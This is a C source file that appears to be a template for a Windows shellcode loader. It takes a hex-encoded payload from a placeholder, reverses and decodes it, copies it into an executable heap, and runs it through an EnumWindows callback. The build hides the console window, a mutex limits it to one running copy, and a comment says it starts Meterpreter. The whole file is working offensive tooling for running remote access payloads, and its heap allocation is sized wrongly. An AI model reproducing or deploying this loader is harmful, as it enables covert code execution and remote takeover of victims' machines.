#pragma comment(linker,"/subsystem:\"windows\"  /entry:\"mainCRTStartup\"" )
#define _CRT_SECURE_NO_DEPRECATE
#include <string.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>


unsigned int FormatCode(char* array) {
	_strrev(array);
	unsigned int char_in_hex;
	unsigned int iterations = strlen(array);
	unsigned int memory_allocation = strlen(array) / 2;
	for (unsigned int i = 0; i < iterations - 1; i++) {
		sscanf_s(array + 2 * i, "%2X", &char_in_hex);
		array[i] = (char)char_in_hex;
	}
	return memory_allocation;
}


void hardCode() {
	char array[] = "{{SHELLCODE_STR}}";
	unsigned int memory_allocation = FormatCode(array);

	//heap
	LPVOID heapp = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	LPVOID ptr = HeapAlloc(heapp, 0, sizeof(memory_allocation));

	RtlMoveMemory(ptr, array, memory_allocation);

	//callback
	::EnumWindows((WNDENUMPROC)ptr, NULL);
}



void MCall() {
	char path[MAX_PATH];
	GetModuleFileName(NULL, path, MAX_PATH);
	char drive[5];
	char dir[MAX_PATH];
	char filename[MAX_PATH];
	char fileext[10];
	_splitpath(path, drive, dir, filename, fileext);
	HANDLE hMutex = CreateMutexA(NULL, FALSE, filename);
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		return;
	}
	hardCode();
}

//
// Main function
//

int main() {

	LPTSTR cmdline;
	cmdline = GetCommandLine();

	char* argv[MAX_PATH];
	char* ch = strtok(cmdline, " ");
	int argc = 0;
	BOOL returnflag = FALSE;
	while (ch != NULL) {
		argv[argc] = (char*)malloc(strlen(ch) + 1);
		strncpy(argv[argc], ch, strlen(ch) + 1);
		ch = strtok(NULL, " ");
		argc++;
	}

	if (argc > 1) {
		if (strcmp(argv[argc - 1], "m") == 0) {
			MCall();
			return 0;
		}
	}
	// Starts the Meterpreter as a normal application
	hardCode();
	return 0;
}